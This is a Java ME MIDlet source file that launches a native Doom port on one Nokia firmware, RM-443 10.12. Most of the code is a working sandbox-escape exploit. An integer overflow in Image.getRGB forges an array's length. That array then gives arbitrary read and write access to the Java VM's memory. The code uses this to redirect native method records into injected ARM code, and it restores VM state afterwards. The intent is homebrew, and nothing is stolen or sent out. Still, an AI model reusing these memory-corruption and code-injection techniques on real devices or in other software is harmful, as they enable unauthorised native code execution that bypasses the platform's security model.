import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import javax.microedition.lcdui.Canvas;
import javax.microedition.lcdui.Command;
import javax.microedition.lcdui.CommandListener;
import javax.microedition.lcdui.Display;
import javax.microedition.lcdui.Displayable;
import javax.microedition.lcdui.Font;
import javax.microedition.lcdui.Graphics;
import javax.microedition.lcdui.Image;
import javax.microedition.midlet.MIDlet;

/** RM-443 10.12 only. The proven OS-info bootstrap is kept intact.
 * Java installs the MIDlet and streams the native image in 4 KiB chunks.
 * One final native invocation owns the complete game until quit/error.
 * No Java repaint, key callback, filesystem or timing is used during play.
 */
public final class DoomLauncher extends MIDlet implements CommandListener {
    private static final int FORGED_LENGTH = 0x40000000;
    private static final int CACHE_SYNC = 0xF0D142A0;       // ARM
    private static final int CACHE_FIRST_WORD = 0xE92D4070;
    private static final int NATIVE_MAGIC = 0x444F4F4D;     // "DOOM"

    private final Command queryCommand = new Command("Start Doom", Command.OK, 1);
    private final Command exitCommand = new Command("Exit", Command.EXIT, 2);
    private Screen screen;
    private String[] lines = {
        "NATIVE DOOM / RM443 10.12", "Put doom1.wad in D:/doom/",
        "or C:/predefgallery/doom/", "D-pad / 2 4 6 8: move",
        "5: fire / select; 0: use", "1 / 3: strafe; 7: run",
        "9: map; #: next weapon", "*: menu; L softkey: select",
        "Choose Start Doom"
    };
    private int[] result;
    private byte[] stageBytes;
    private byte[] nativeBytes;
    private boolean running;

    /* result[] is the loader command/return descriptor (native/loader.c).
     * [0] magic [1] command [2] allocated image [3] status
     * [4..10] native diagnostics [11..14] loading bounds/entry
     * [16..79] error text [80] method slot to restore [96..1119] 4KiB transfer.
     * No transfer calls occur once the game starts.
     */

    /* Temporary bootstrap objects. No UI objects are allocated while forged. */
    private int[] payload;
    private int[] canary;
    private Object[] pointerBox;
    private int[] target;
    private int[] destination;
    private boolean forged;
    private int viewBase;
    private int cacheMethod;
    private int queryMethod;
    private int cacheFlags;
    private int canaryOriginal;
    private boolean canaryDirty;

    /*
     * Zero arguments: the ROM cache helper does not perform KNI cleanup.
     * Calling that helper through a method with arguments would leave the
     * native operand stack unbalanced, so cacheMarker is deliberately separate.
     */
    private static native void cacheMarker();

    /*
     * One argument: the ARM payload calls KNI_GetParameterAsObject(1, ...).
     * Static native parameters start at index 1; index 0 is reserved for the
     * receiver of an instance native method. loader.S finishes with the
     * firmware's KNI_ReturnVoid routine to discard this argument correctly.
     */
    private static native void nativeQuery(int[] output);

    protected void startApp() {
        if (screen == null) {
            result = new int[1120];
            screen = new Screen();
            screen.addCommand(queryCommand);
            screen.addCommand(exitCommand);
            screen.setCommandListener(this);
            Display.getDisplay(this).setCurrent(screen);
        }
    }

    protected void pauseApp() {
    }

    protected void destroyApp(boolean unconditional) {
    }

    public void commandAction(Command command, Displayable displayable) {
        if (command == exitCommand) {
            notifyDestroyed();
        } else if (command == queryCommand && !running) {
            new Thread(new Runnable() { public void run() { runQuery(); } }).start();
        }
    }

    /**
     * Runs one complete transient native session.
     *
     * <p>The finally block is part of the safety boundary, not just cleanup:
     * showResult allocates Strings and repaints the Canvas, so it must not run
     * until every KVM word has been restored. Restoration errors are retained
     * for display rather than silently replacing a successful native result.</p>
     */
    private void runQuery() {
        if (running) return;
        running = true;
        screen.removeCommand(queryCommand);
        screen.removeCommand(exitCommand);
        int error = 0;
        Throwable thrown = null;
        try {
            error = runChain();
            if (error == 0) {
                // Restore the forged array BEFORE any streaming or allocation.
                // The loader clears its own method binding on final run/free.
                target[0x3FFFFFFF] = 1;
                forged = false;
                loadGame();
                if (result[3] != 0) error = result[3];
            }
        } catch (Throwable t) { thrown = t;
        } finally {
            try {
                if (queryMethod != 0 && result[84] != 0) {
                    result[1] = 4;
                    nativeQuery(result);
                    queryMethod = 0;
                }
                restoreKvmState();
            } catch (Throwable t) { if (thrown == null) thrown = t; error = 90; }
            running = false;
        }
        screen.addCommand(queryCommand);
        screen.addCommand(exitCommand);
        showResult(error, thrown);
    }

    private static int resourceWord(InputStream in) throws IOException {
        int a=in.read(), b=in.read(), c=in.read(), d=in.read();
        if ((a|b|c|d)<0) throw new IOException("Truncated native header");
        return a | (b<<8) | (c<<16) | (d<<24);
    }
    private void loaderCall(int op) throws IOException {
        result[1]=op;
        nativeQuery(result);
        if (result[0]!=NATIVE_MAGIC || result[3]!=0)
            throw new IOException("Loader check " + result[3]);
    }
    private void transfer(InputStream in, byte[] buf, int offset, int size) throws IOException {
        while (size>0) {
            int n=size>buf.length?buf.length:size;
            int pos=0;
            while (pos<n) {
                int r=in.read(buf,pos,n-pos);
                if (r<0) throw new IOException("Truncated native image");
                if (r==0) { int c=in.read(); if(c<0)throw new IOException("Native EOF");buf[pos++]=(byte)c; }
                else pos+=r;
            }
            for (int i=n;i<((n+3)&~3);i++)buf[i]=0;
            for (int i=0;i<n;i+=4)result[96+(i>>2)]=littleEndianWord(buf,i);
            result[12]=offset;result[13]=n;loaderCall(2);
            offset+=n;size-=n;
        }
    }
    private void loadGame() throws IOException {
        InputStream in=DoomLauncher.class.getResourceAsStream("/doom.bin");
        if (in==null)throw new IOException("Missing doom.bin");
        int memory, entry, relocations, stack;
        try {
            if(resourceWord(in)!=0x30443453 || resourceWord(in)!=1)
                throw new IOException("Bad native image version");
            int bytes=resourceWord(in);
            memory=resourceWord(in);entry=resourceWord(in);
            relocations=resourceWord(in);stack=resourceWord(in);
            int reserved=resourceWord(in);
            if(bytes<=0 || bytes>memory || memory>3*1024*1024 || (memory&3)!=0 ||
                    entry<0 || entry>=bytes || relocations<0 || relocations>65536 ||
                    stack!=196608 || reserved!=0)
                throw new IOException("Bad native image bounds");
            byte[] buf=new byte[4096];
            result[11]=memory+4*relocations+stack;
            loaderCall(1);
            transfer(in,buf,0,bytes);
            transfer(in,buf,memory,4*relocations);
            if(in.read()!=-1)throw new IOException("Trailing native image bytes");
        } finally { in.close(); }
        result[12]=memory;result[13]=relocations;result[14]=entry;
        result[1]=3;
        // Native entry restores this method slot before running the engine.
        // After it returns there is no callable native binding left.
        queryMethod=0;
        nativeQuery(result);
    }

    /**
     * Returns a numeric error instead of allocating exception objects after
     * target.length has been forged. All text is formatted after restoration.
     */
    private int runChain() throws IOException {
        if (stageBytes == null) {
            /* Resource I/O allocates buffers, so it belongs before System.gc()
             * and well before the five-array layout used by the bootstrap. */
            stageBytes = readResource("/stage.bin");
            nativeBytes = readResource("/native.bin");
        }
        if (stageBytes == null || nativeBytes == null) {
            return 1;
        }
        if ((stageBytes.length & 3) != 0 || stageBytes.length > 56 ||
                (nativeBytes.length & 3) != 0 || nativeBytes.length == 0 ||
                nativeBytes.length > 3072) {
            return 2;
        }

        result[0] = 0;
        result[1] = 0;
        result[2] = 0;
        for (int i = 3; i < result.length; i++) {
            result[i] = 0;
        }
        int[] rgb = { FORGED_LENGTH };
        Image source = Image.createRGBImage(rgb, 1, 1, true);
        int[] measured = new int[1];
        source.getRGB(measured, 0, 1, 0, 0, 1, 1);
        /* The eventual corrupting write is a pixel copy, not a raw integer
         * store. Measure the device's ARGB conversion first: if this value is
         * not preserved exactly, it cannot safely become the forged length. */
        if (measured[0] != FORGED_LENGTH) {
            return 3;
        }

        /* Release the previous invocation's complete object group before GC. */
        payload = null;
        canary = null;
        pointerBox = null;
        target = null;
        destination = null;
        cacheMethod = 0;
        queryMethod = 0;
        canaryDirty = false;
        forged = false;
        System.gc();

        /*
         * Exact KVM high-end allocation order. There must be no object
         * allocation between these five statements.
         *
         *   destination[11]       = target.length
         *   target[5..8]          = pointerBox[0..3]
         *   target[13..14]        = canary[0..1]
         */
        payload = new int[1024];
        canary = new int[2];
        pointerBox = new Object[4];
        target = new int[1];
        destination = new int[8];
        canary[0] = 0x13579BDF;
        canary[1] = 0x2468ACE0;
        pointerBox[0] = payload;
        pointerBox[1] = this;
        pointerBox[2] = target;
        pointerBox[3] = canary;

        if (target.length != 1) {
            return 4;
        }
        overflowedOnePixelWrite(source, destination, 11);
        if (target.length != FORGED_LENGTH) {
            return 5;
        }
        forged = true;
        /* From this point until restoreKvmState, target is an address-translation
         * window, not an ordinary one-element array. readWord/writeWord exploit
         * 32-bit index scaling to reach any aligned KVM address. */
        if (target[13] != 0x13579BDF || target[14] != 0x2468ACE0 ||
                canary[0] != 0x13579BDF || canary[1] != 0x2468ACE0) {
            return 6;
        }

        /* Prove reversible cross-object access before touching method metadata. */
        canaryOriginal = canary[0];
        canaryDirty = true;
        target[13] = canaryOriginal + 1;
        if (canary[0] != canaryOriginal + 1) {
            return 7;
        }
        target[13] = canaryOriginal;
        canaryDirty = false;
        if (canary[0] != canaryOriginal) {
            return 8;
        }

        int payloadObject = target[5];
        int midletObject = target[6];
        int targetObject = target[7];
        int canaryObject = target[8];
        if (payloadObject == 0 || midletObject == 0 || targetObject == 0 ||
                canaryObject == 0 ||
                ((payloadObject | midletObject | targetObject | canaryObject) & 3) != 0) {
            return 9;
        }
        viewBase = targetObject + 12;

        /*
         * Recover metadata from live pointers rather than hardcoded heap
         * addresses. On this KVM an instance's class pointer is at object+0,
         * the writable method-table pointer is at class+36, the table starts
         * with a count, and each following method record is 32 bytes.
         */
        int classObject = readWord(midletObject);
        if (classObject == 0 || (classObject & 3) != 0) {
            return 10;
        }
        int methodTable = readWord(classObject + 36);
        if (methodTable == 0 || (methodTable & 3) != 0) {
            return 10;
        }
        int methodCount = readWord(methodTable);
        if (methodCount < 1 || methodCount > 512) {
            return 10;
        }
        cacheMethod = findNativeMethod(methodTable, methodCount, classObject, 0);
        queryMethod = findNativeMethod(methodTable, methodCount, classObject, 1);
        if (cacheMethod == 0 || queryMethod == 0 || cacheMethod == queryMethod) {
            return 11;
        }
        cacheFlags = readWord(cacheMethod + 20);
        int queryFlags = readWord(queryMethod + 20);
        /* Preserve the raw record words before changing anything. These values
         * distinguish a flag-layout assumption from an already-bound code slot. */
        result[7] = cacheFlags;
        result[8] = queryFlags;
        result[9] = readWord(cacheMethod + 4);
        result[10] = readWord(queryMethod + 4);
        result[11] = readWord(cacheMethod + 28);
        result[12] = readWord(queryMethod + 28);
        result[13] = (cacheMethod - methodTable - 4) / 32;
        result[14] = (queryMethod - methodTable - 4) / 32;
        result[15] = methodCount;
        /* KVM adds ACC_POINTER|ACC_DOUBLE (0xC000) to void methods as internal
         * return-type metadata. Thus both private static native void records
         * have runtime flags 0xC10A, not just the class-file bits 0x10A. Keep
         * the original full words for restoration, including these extra bits. */
        if ((cacheFlags & 0xFFFF) != 0xC10A || (queryFlags & 0xFFFF) != 0xC10A ||
                result[9] != 0 || result[10] != 0) {
            return 12;
        }

        /* Select an address that is also safe when read as KVM method flags. */
        int payloadData = payloadObject + 12;
        int stageIndex = findStageIndex(payloadData, payload.length, cacheMethod,
                stageBytes.length, nativeBytes.length);
        if (stageIndex < 0) {
            return 13;
        }
        int stageAddress = payloadData + (stageIndex << 2);
        int nativeIndex = stageIndex + 16;
        if ((nativeIndex << 2) + nativeBytes.length > (payload.length << 2)) {
            return 14;
        }
        int nativeAddress = payloadData + (nativeIndex << 2);
        copyWords(nativeBytes, payload, nativeIndex);
        /* stage.bin is position independent except for three literal slots.
         * Patch those slots with this invocation's live payload address, exact
         * byte length, and firmware cache helper before synchronizing it. */
        if (!copyAndPatchStage(stageBytes, payload, stageIndex,
                nativeAddress, nativeBytes.length)) {
            return 15;
        }
        if (readWord(CACHE_SYNC) != CACHE_FIRST_WORD) return 17;

        /*
         * At the native BLX, r0=accessFlags and r1=methodRecord. Supplying the
         * stage address as flags gives the cache helper r0=A and a wrapped end
         * A+methodRecord. Its first two 32-byte lines cover this entire stage.
         * cacheMarker has no Java arguments, so direct ROM return needs no KNI
         * argument cleanup.
         */
        writeWord(cacheMethod + 20, stageAddress);
        writeWord(cacheMethod + 4, CACHE_SYNC);
        cacheMarker();
        writeWord(cacheMethod + 4, 0);
        writeWord(cacheMethod + 20, cacheFlags);
        cacheMethod = 0;

        /* The stage now synchronizes the full ARM payload and enters it.
         * stageAddress is intentionally even: BLX would interpret bit zero set
         * as a Thumb entry. The native method's own access flags stay intact,
         * so nativeQuery still receives result[] through the normal KNI frame. */
        writeWord(queryMethod + 4, stageAddress);
        result[80] = queryMethod + 4;
        result[82] = nativeAddress;
        result[83] = nativeBytes.length;
        nativeQuery(result);
        // Keep the loader bound while loadGame streams the image.
        if (result[0] != NATIVE_MAGIC) {
            return 16;
        }
        if (result[3] != 0 || result[84] == 0) return 18;
        return 0;
    }

    /**
     * Undo in dependency order while the forged view is still available:
     * native code pointers/flags first, canary second, array length last.
     * Setting target.length to one removes the ability to repair anything else,
     * so no later statement may depend on out-of-bounds target accesses.
     */
    private void restoreKvmState() {
        if (!forged) {
            return;
        }
        if (cacheMethod != 0) {
            writeWord(cacheMethod + 4, 0);
            writeWord(cacheMethod + 20, cacheFlags);
            cacheMethod = 0;
        }
        if (queryMethod != 0) {
            writeWord(queryMethod + 4, 0);
            queryMethod = 0;
        }
        if (canaryDirty) {
            target[13] = canaryOriginal;
            canaryDirty = false;
        }
        /* index scaling wraps to target+8, the original length field */
        target[0x3FFFFFFF] = 1;
        forged = false;
    }

    /**
     * Locates an unresolved native method by structural properties, not by its
     * position in the compiler-generated method table. The relevant record
     * fields are code+4, accessFlags+20, owner+24, and argumentCount+30.
     * Since +30 is the upper half of the word at +28, the argument count is
     * extracted with an unsigned 16-bit shift. Ambiguity returns zero: choosing
     * an arbitrary matching record could redirect an unrelated native method.
     */
    private int findNativeMethod(int table, int count, int owner, int wantedArgs) {
        int found = 0;
        for (int i = 0; i < count; i++) {
            int method = table + 4 + i * 32;
            int flags = readWord(method + 20);
            int args = readWord(method + 28) >>> 16;
            if (readWord(method + 24) == owner &&
                    readWord(method + 4) == 0 &&
                    (flags & 0x108) == 0x108 && args == wantedArgs) {
                if (found != 0) {
                    return 0; // ambiguous: do not guess
                }
                found = method;
            }
        }
        return found;
    }

    /*
     * target[0] is at viewBase=targetObject+12. KVM computes an element address
     * as viewBase+(index<<2) modulo 2^32. Subtracting viewBase and shifting
     * right unsigned therefore maps every aligned 32-bit address to a positive
     * index in 0..0x3fffffff, all accepted by the forged length 0x40000000.
     * This also handles addresses numerically below targetObject via wraparound.
     */
    private int readWord(int address) {
        int index = (address - viewBase) >>> 2;
        return target[index];
    }

    private void writeWord(int address, int value) {
        int index = (address - viewBase) >>> 2;
        target[index] = value;
    }

    /* Java has no unsigned int comparison. Flipping the sign bit maps unsigned
     * order onto signed order without using long or allocating boxed values. */
    private static boolean unsignedLess(int a, int b) {
        return (a ^ 0x80000000) < (b ^ 0x80000000);
    }

    /**
     * The stage address doubles as cacheMarker's accessFlags. Require
     * ACC_NATIVE|ACC_STATIC, but reject ACC_ABSTRACT (0x400): RM-443's first
     * invokestatic path tests it at F0DDA8CC BEFORE its native dispatch at
     * F0DDA940. Ignoring that bit causes AbstractMethodError: cacheMarker for
     * some heap layouts, even with a valid code pointer. Do not just mask the
     * flags after choosing an address: r0 must still point at the actual stage.
     *
     * The cache helper needs a wrapped end (A+methodRecord < A unsigned).
     * Its two 32-byte cache lines must cover the whole stage. Reserve 64 bytes
     * before the loader, and ensure both fit in the payload array. This helper
     * must remain allocation-free while target.length is forged.
     */
    private static int findStageIndex(int payloadData, int payloadWords,
            int methodAddress, int stageLength, int nativeLength) {
        for (int i = 0; ((i + 16) << 2) + nativeLength <= (payloadWords << 2); i++) {
            int address = payloadData + (i << 2);
            if ((address & 0x108) == 0x108 && (address & 0x400) == 0 &&
                    unsignedLess(address + methodAddress, address) &&
                    stageLength <= 64 - (address & 31)) return i;
        }
        return -1;
    }

    /**
     * Turns the public one-pixel copy into destination[d].
     *
     * <p>Java's signed additions overflow: x+width and offset+width become
     * negative and pass the upper-bound checks. The native wrapper narrows x,
     * width, and scanlength to 0, 1, and 1, but retains the 32-bit offset in
     * object+12+(offset<<2). Since (0x40000000+d)<<2 wraps to d*4, the native
     * destination is exactly destination[d].</p>
     */
    private static void overflowedOnePixelWrite(Image image, int[] output, int d) {
        image.getRGB(output,
                0x40000000 + d,
                0x40000001,
                0x40000000,
                0,
                0x40000001,
                1);
    }

    /* ARM instructions and literals are embedded little-endian. The final byte
     * is signed deliberately: shifting it by 24 preserves bit 31, while the
     * lower three bytes are masked to avoid unwanted sign extension. */
    private static int littleEndianWord(byte[] bytes, int offset) {
        return (bytes[offset] & 255) |
                ((bytes[offset + 1] & 255) << 8) |
                ((bytes[offset + 2] & 255) << 16) |
                (bytes[offset + 3] << 24);
    }

    private static void copyWords(byte[] bytes, int[] words, int wordIndex) {
        for (int i = 0; i < bytes.length; i += 4) {
            words[wordIndex + (i >> 2)] = littleEndianWord(bytes, i);
        }
    }

    /**
     * Copies and relocates the tiny first stage without allocating another
     * array. Each placeholder sets a different bit; all three must be seen.
     * verify.py independently requires exactly one of each in stage.bin, so a
     * duplicate cannot silently satisfy this mask in the distributed resource.
     */
    private static boolean copyAndPatchStage(byte[] bytes, int[] words, int wordIndex,
            int nativeAddress, int nativeLength) {
        int patches = 0;
        for (int i = 0; i < bytes.length; i += 4) {
            int word = littleEndianWord(bytes, i);
            if (word == 0xDEAD0001) {
                word = nativeAddress;
                patches |= 1;
            } else if (word == 0xDEAD0002) {
                word = nativeLength;
                patches |= 2;
            } else if (word == 0xDEAD0003) {
                word = CACHE_SYNC;
                patches |= 4;
            }
            words[wordIndex + (i >> 2)] = word;
        }
        return patches == 7;
    }

    private static byte[] readResource(String name) throws IOException {
        InputStream input = DoomLauncher.class.getResourceAsStream(name);
        if (input == null) {
            return null;
        }
        try {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[256];
            int count;
            while ((count = input.read(buffer)) >= 0) {
                if (count != 0) {
                    output.write(buffer, 0, count);
                }
            }
            return output.toByteArray();
        } finally {
            input.close();
        }
    }

    private void showResult(int error, Throwable thrown) {
        StringBuffer message = new StringBuffer();
        for(int i=0;i<256;i++) {
            int c=(result[16+(i>>2)] >>> ((i&3)*8))&255;
            if(c==0)break;
            message.append((char)c);
        }
        String text=message.toString();
        lines = new String[15];
        lines[0]=error==0&&thrown==null?"NATIVE DOOM RETURNED":"DOOM START/PLAY FAILED";
        lines[1]=thrown==null?"Check " + error:thrown.toString();
        lines[2]="Stage " + result[4] + " frames " + result[5];
        lines[3]="Task " + result[6] + " app " + result[7];
        lines[4]="Last key " + result[8] + " type " + result[9];
        lines[5]="Native ms " + result[10];
        if (error == 12) {
            lines[2]="Cache flags " + hex(result[7]);
            lines[3]="Loader flags " + hex(result[8]);
            lines[4]="Cache code " + hex(result[9]);
            lines[5]="Loader code " + hex(result[10]);
        } else if (error == 18) {
            lines[2]="Loader status " + result[3];
        }
        for(int i=6;i<14;i++) {
            int start=(i-6)*32;
            lines[i]=start<text.length()?text.substring(start,Math.min(start+32,text.length())):"";
        }
        lines[14]="Start Doom = fresh session";
        screen.repaint();screen.serviceRepaints();
    }

    private static String hex(int value) {
        return "0x" + Integer.toHexString(value).toUpperCase();
    }

    private final class Screen extends Canvas {
        Screen() { setFullScreenMode(true); }
        protected void paint(Graphics graphics) {
            int width = getWidth();
            int height = getHeight();
            graphics.setColor(0x000000);
            graphics.fillRect(0, 0, width, height);
            Font font = Font.getFont(Font.FACE_SYSTEM, Font.STYLE_PLAIN, Font.SIZE_SMALL);
            graphics.setFont(font);
            int lineHeight = font.getHeight() + 3;
            int y = 5;
            graphics.setColor(0x00FF80);
            graphics.drawString("Doom", 6, y, Graphics.TOP | Graphics.LEFT);
            y += lineHeight + 3;
            graphics.setColor(0xFFFFFF);
            for (int i = 0; i < lines.length && y < height; i++) {
                graphics.drawString(lines[i], 6, y, Graphics.TOP | Graphics.LEFT);
                y += lineHeight;
            }
        }
    }
}
